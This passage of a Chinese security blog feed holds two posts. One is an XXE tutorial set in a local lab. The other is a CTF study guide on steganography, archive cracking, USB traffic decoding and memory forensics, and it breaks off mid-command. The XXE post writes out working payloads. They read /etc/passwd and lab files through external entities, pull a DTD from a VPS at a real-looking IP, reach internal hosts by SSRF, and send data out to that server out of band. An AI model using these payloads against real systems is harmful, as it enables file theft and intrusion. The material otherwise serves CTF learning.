class_">DOMDocument</span>();<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;  encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-string">&lt;root&gt;</span><br><span class="hljs-string">    &lt;man&gt;&lt;name&gt;张三&lt;/name&gt;&lt;age&gt;2000&lt;/age&gt;</span><br><span class="hljs-string">    &lt;/man&gt;</span><br><span class="hljs-string">    &lt;man&gt;&lt;name&gt;李四&lt;/name&gt;&lt;age&gt;2021&lt;/age&gt;</span><br><span class="hljs-string">    &lt;/man&gt;</span><br><span class="hljs-string">&lt;/root&gt;&#x27;</span>;<br><span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">loadxml</span>(<span class="hljs-variable">$str</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">saveXML</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="DTD声明介绍"><a href="#DTD声明介绍" class="headerlink" title="DTD声明介绍"></a>DTD声明介绍</h3><p>DID（文档类型定义）用来定义我们自己定义的标记的含义。</p><p>DTD可被成行地声明于XML文档中，也可作为外部引用。</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">!DOCTYPE 定义约束  !ELEMENT 定义元素  !NOTATION 定义符号 ！ENETITY 定义实体<br></code></pre></td></tr></table></figure><p>DOCTYPE格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素 [元素声明]&gt;<br></code></pre></td></tr></table></figure><p>内部引入实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE data [<br>  &lt;!ENTITY company &quot;OpenAI&quot;&gt; <br>]&gt;<br>&lt;data&gt;<br>  &lt;name&gt;&amp;company;&lt;/name&gt;<br>&lt;/data&gt;<br></code></pre></td></tr></table></figure><p>外部引入实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE root SYSTEM &quot;1.dtd&quot;&gt;<br></code></pre></td></tr></table></figure><h3 id="XML实体介绍"><a href="#XML实体介绍" class="headerlink" title="XML实体介绍"></a>XML实体介绍</h3><p>实体ENTITY是一种替换机制，用来在文档中引用外部或内部的内容。</p><p>1、内部通用实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY compangy  &quot;OpenAI&quot;&gt;<br> &lt;data&gt;&amp;file;&lt;/data&gt;<br></code></pre></td></tr></table></figure><p>2、外部通用实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br> &lt;data&gt;&amp;file;&lt;/data&gt;<br></code></pre></td></tr></table></figure><p>3、参数实体（参数实体只能在DTD中使用，以%开头。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % external SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>%external;&gt;<br></code></pre></td></tr></table></figure><p>4、未解析实体</p><p>这种实体用于引用<strong>非 XML 数据（如图片或二进制文件）</strong>。<br> 它们不会被解析器直接加载，而是用于告诉应用程序”这里有个外部二进制资源”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY img SYSTEM &quot;photo.jpg&quot; NDATA jpg&gt;<br></code></pre></td></tr></table></figure><h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><p><strong>POC</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">ben</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-symbol">&amp;ben;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="使用外部实体检索文件"><a href="#使用外部实体检索文件" class="headerlink" title="使用外部实体检索文件"></a>使用外部实体检索文件</h3><p>1、查看源代码发现POST提交的数据会被解析为XML格式</p><p><img src="/img/image-20251119161550988.png" alt="image-20251119161550988"></p><p>2、bp抓包也能发现</p><p><img src="/img/image-20251119161636203.png" alt="image-20251119161636203"></p><p>3、随后通过外部实体利用php伪协议读取</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///E:/phpstudy_pro/WWW/xxe-lab/php_xxe/flag.txt&quot;</span> &gt;</span>    #确保读取文件为绝对路径</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-symbol">&amp;file;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-symbol">&amp;file;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20251119163623981.png" alt="image-20251119163623981"></p><h3 id="参数实体和http协议利用"><a href="#参数实体和http协议利用" class="headerlink" title="参数实体和http协议利用"></a>参数实体和http协议利用</h3><p>如果不允许进行file伪协议读取，那如何读取呢</p><p><img src="/img/image-20251119170228076.png" alt="image-20251119170228076"></p><p>首先在vps起一个dtd</p><p><img src="/img/image-20251119165013581.png" alt="image-20251119165013581"></p><p>确保可以正常访问</p><p><img src="/img/image-20251119165229975.png" alt="image-20251119165229975"></p><p>随后编写poc</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dazhuang</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.96.99.165/1.dtd&quot;</span> &gt;</span> %dazhuang;]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-symbol">&amp;file;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-symbol">&amp;file;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20251119170141220.png" alt="image-20251119170141220"></p><p>最终发现成功读取</p><h3 id="XXE实现SSRF"><a href="#XXE实现SSRF" class="headerlink" title="XXE实现SSRF"></a>XXE实现SSRF</h3><p>利用http伪协议访问内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note [<br>&lt;!ENTITY file SYSTEM &quot;http://10.1.2.3/&quot; &gt;    #确保读取文件为绝对路径<br>]&gt;<br>&lt;user&gt;&lt;username&gt;<br>&amp;file;<br>&lt;/username&gt;&lt;password&gt;<br>&amp;file;<br>&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><h3 id="php伪协议读取源代码"><a href="#php伪协议读取源代码" class="headerlink" title="php伪协议读取源代码"></a>php伪协议读取源代码</h3><p>有时候读取源代码没有回显，可以采用php伪协议base64编码读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note [<br>&lt;!ENTITY file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://10.1.2.3/?cmd=cat+index.php&quot; &gt;    <br>]&gt;<br>&lt;user&gt;&lt;username&gt;<br>&amp;file;<br>&lt;/username&gt;&lt;password&gt;<br>&amp;file;<br>&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><h3 id="无回显XXE外带数据"><a href="#无回显XXE外带数据" class="headerlink" title="无回显XXE外带数据"></a>无回显XXE外带数据</h3><p><img src="/img/image-20251119211306575.png" alt="image-20251119211306575"></p><p>在vps上起一个web服务</p><p>写好外部DTD</p><p><img src="/img/image-20251119213404034.png" alt="image-20251119213404034"></p><p>起web服务</p><p><img src="/img/image-20251119212307211.png" alt="image-20251119212307211"></p><p>监听7777端口</p><p><img src="/img/image-20251119215009320.png" alt="image-20251119215009320"></p><p>随后bp挂载POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE note [&lt;!ENTITY % dazhuang SYSTEM &quot;http://47.96.99.165/1.dtd&quot; &gt; %dazhuang; %int; %send;]&gt;<br>&lt;user&gt;&lt;username&gt;<br>admin<br>&lt;/username&gt;&lt;password&gt;<br>password<br>&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><p>最终发现vps成功得到回显</p><p><img src="/img/image-20251119215112752.png" alt="image-20251119215112752"></p><h3 id="svg文件上传实现XXE"><a href="#svg文件上传实现XXE" class="headerlink" title="svg文件上传实现XXE"></a>svg文件上传实现XXE</h3><p>poc</p><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs svg"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>XXE</tag>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC知识整合</title>
    <link href="/2025/11/07/MISC%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88/"/>
    <url>/2025/11/07/MISC%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC知识整合"><a href="#MISC知识整合" class="headerlink" title="MISC知识整合"></a>MISC知识整合</h1><p>最近在准备省赛打算全面整理复习一下MISC知识点，MISC包含几个大向：编码转换，隐写术，压缩包分析，流量分析，各种取证</p><h2 id="1、图片隐写"><a href="#1、图片隐写" class="headerlink" title="1、图片隐写"></a>1、图片隐写</h2><p>附加式隐写–字符串：大多数情况下信息会被隐藏在末尾，这样不会对图片本身的显示产生影响。当然也不排除将隐藏的信息放在其他地方，这时候我们可以通过搜索文本的方式来寻找。我们可以通过快捷键 ctrl+f 调出 010editor 的查找功能，一般情况下我们会去查找一些关键字，比如 flag、ctf、key 等等。</p><p>或者用strings查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs linux">strings  a.png  |  grep  &quot;flag&#123;&#125;&quot;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20251107124832231.png" alt="image-20251107124832231"></p><p>附加式隐写–图种：图片文件和其他文件结合起来的文件</p><p>使用binwalk\foremost进行识别和还原</p><p><img src="/img/image-20251107130318066.png" alt="image-20251107130318066"></p><p><img src="/img/image-20251107172803019.png" alt="image-20251107172803019"></p><p>附加式隐写-EXIF隐写</p><p>可交换图像文件格式（Exchangeable image file format，exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p><p>通过打开属性即可查看exif信息</p><p><img src="/img/image-20251107172839760.png" alt="image-20251107172839760"></p><p>图片宽高隐写</p><p>一张图片我们可以通过修改其宽高的方式来隐藏信息。但是修改宽度会导致图片变形，所以多数情况下是修改高度。</p><p>一般情况下我们只需将高度的值修改的尽量大些就可以看到隐藏的信息了。</p><p><img src="/img/02-bmp%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98.bmp" alt="02-bmp图片宽高"></p><p>LSB隐写</p><p>图片中的像素一般是由三原色（红绿蓝）组成，三原色可以再组成其他各种颜色。在 png 图片中，每个颜色占有 8 bit，即 256 种颜色，那么就可以组合成 16777216 种颜色。比如 RGB 值为 (0,255,0) 的颜色为绿色，那么我们将其中的 255 改成 254，仅凭肉眼的话其实是看不出颜色的变化的。如果一个 png 图片我们将它里面的每一个 RGB 值都做一点变动，对于整个图片来说变化也是微乎其微的了。LSB 隐写就是修改 RGB 颜色分量的最低二进制位，颜色依旧看不出有什么变化，从而达到隐藏信息的目的。</p><p>一般对于 LSB 隐写我们常用的有两个工具，一个是 stegsolve，多见于 Windows 系统，另外一个是 zsteg，多见于 Linux 系统。</p><p><img src="/img/image-20251107125604095.png" alt="image-20251107125604095"></p><p>盲水印提取</p><p>盲水印就是把我们的水印隐藏在图片中，但是隐藏前后的图片在视觉上没有任何区别。在 CTF 中比较常见的盲水印工具是 BlindWaterMark，在还原时需要提供两张看起来一样的图片</p><h2 id="2、压缩包分析"><a href="#2、压缩包分析" class="headerlink" title="2、压缩包分析"></a>2、压缩包分析</h2><p>伪加密—zip伪加密放进linux直接解压，–rar伪加密修改标志位</p><p>暴力破解，一般选择纯数字，如果存在提示那可以采用字典破解方式</p><p>也可以采用掩码攻击的方式，如已知 7 位密码中的第 3 位为 a，第 6 位为 b ，那么可以构造 ??a??b? 进行掩码攻击。</p><p>明文攻击</p><h2 id="3、流量分析"><a href="#3、流量分析" class="headerlink" title="3、流量分析"></a>3、流量分析</h2><p>1、TLS流量分析</p><p>对于TLS流量，我们只需要导入sslkey.log文件进行流量解密</p><p><img src="/img/image-20251107144926151.png" alt="image-20251107144926151"></p><p>2、鼠标流量</p><p>以下是鼠标流量特征</p><p><img src="/img/image-20251107145052712.png" alt="image-20251107145052712"></p><p>我们只需要先将usb数据提取出来，通过以下命令</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tshark –<span class="hljs-attribute">r</span> mouse<span class="hljs-selector-class">.pcapng</span> –T fields –e usb<span class="hljs-selector-class">.capdata</span> &gt; usbdata<span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></table></figure><p>再利用工具直接借助 Github 项目 UsbMiceDataHacker。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">python</span> UsbMiceDataHacker.py <span class="hljs-keyword">mouse</span>.pcapng LEFT <br></code></pre></td></tr></table></figure><p>3、键盘流量分析</p><p>以下是键盘流量特征</p><p><img src="/img/image-20251107145515538.png" alt="image-20251107145515538"></p><p>我们可以运行以下命令提取所以键盘数据</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tshark -<span class="hljs-attribute">r</span> atta<span class="hljs-selector-class">.NISACTF_2022flag</span><span class="hljs-selector-class">.pcap</span> -T fields -e usb<span class="hljs-selector-class">.capdata</span> &gt; usbdata<span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></table></figure><p>然后编写脚本转换为可读字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br>mappings = &#123;<span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0a</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-number">0x0b</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0c</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-number">0x0d</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0e</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0f</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1a</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1b</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1c</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1d</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-number">0x1e</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1f</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-number">0x29</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-number">0x2b</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-number">0x2c</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-number">0x2d</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-number">0x2e</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-number">0x2f</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-number">0x35</span>:<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-number">0x38</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-number">0x39</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-number">0x3a</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-number">0x3b</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-number">0x3c</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-number">0x3d</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-number">0x3e</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-number">0x3f</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-number">0x40</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-number">0x41</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-number">0x42</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-number">0x43</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-number">0x44</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-number">0x45</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        line = line.strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) == <span class="hljs-number">16</span>:<br>            s = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(line) == <span class="hljs-number">24</span>:<br>            s = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> s != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> s <span class="hljs-keyword">in</span> mappings:<br>            result += mappings[s]<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>也可借助 Github 项目 UsbKeyboardDataHacker。</p><h2 id="4、取证分析"><a href="#4、取证分析" class="headerlink" title="4、取证分析"></a>4、取证分析</h2><p>磁盘取证对已经删除的文件进行恢复，可以用DiskGenius</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-25%20170414-1762502054482-1.png" alt="屏幕截图 2025-07-25 170414"></p><p>内存取证</p><p>CTF 中的内存取证题，往往会提供一个完整的内存镜像，一般来说内存镜像文件都较大，1G 大小以上的文件比比皆是。最常用的取证工具之一是 volatility</p><p>使用 volatility -h 命令查看详细的使用方法。以下列出几种较为常见参数选项意义。</p><table><thead><tr><th>插件命令</th><th>说明</th></tr></thead><tbody><tr><td>clipboard</td><td>提取 windows 剪切板的内容</td></tr><tr><td>cmdscan</td><td>查看历史命令</td></tr><tr><td>envars</td><td>查看环境变量</td></tr><tr><td>filescan</td><td>扫描文件</td></tr><tr><td>hashdump</td><td>从内存中提取哈希密码(LM&#x2F;NTLM)</td></tr><tr><td>imageinfo</td><td>查看镜像的基本信息</td></tr><tr><td>mimikatz</td><td>提取明文密码</td></tr><tr><td>netscan</td><td>查看网络连接状态</td></tr><tr><td>notepad</td><td>查看展示的记事本内容</td></tr><tr><td>editbox</td><td>查看编辑内容</td></tr><tr><td>pstree</td><td>将进程显示为树状列表</td></tr><tr><td>screenshot</td><td>获取系统在此刻的截图</td></tr></tbody></table><p>获取系统信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> vol.py -f <span class="hljs-string">&quot;Windows 7-dde00fa9.vmem&quot;</span> windows.<span class="hljs-literal">info</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-28%20112558-1762502386706-3.png" alt="屏幕截图 2025-07-28 112658"></p><p>搜索相关文件并提取</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">$<span class="hljs-keyword">en</span><span class="hljs-variable">v:PYTHONIOENCODING</span> = <span class="hljs-string">&quot;utf-8&quot;</span><br><span class="hljs-keyword">python</span> vol.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">f</span> <span class="hljs-string">&quot;Windows 7-dde00fa9.vmem&quot;</span> windows.filescan | Select-String <span class="hljs-string">&quot;My_Wifi&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250728171922516-1762502442296-5.png" alt="image-20250728171922516"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python vol<span class="hljs-selector-class">.py</span> -f <span class="hljs-string">&quot;Windows 7-dde00fa9.vmem&quot;</span> windows<span class="hljs-selector-class">.dumpfiles</span> <span class="hljs-attr">--physaddr</span> <span class="hljs-number">0</span>x3fdc38c8<br>Rename-Item <span class="hljs-string">&quot;file.0x3fdc38c8.dmp&quot;</span> <span class="hljs-string">&quot;My_Wifi.zip&quot;</span><br></code></pre></td></tr></table></figure><p>从内存镜像中提取网络接口信息：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">python</span> <span class="hljs-variable">vol</span><span class="hljs-operator">.</span><span class="hljs-variable">py</span> <span class="hljs-operator">-</span><span class="hljs-variable">f</span> <span class="hljs-string">&quot;Windows 7-dde00fa9.vmem&quot;</span> <span 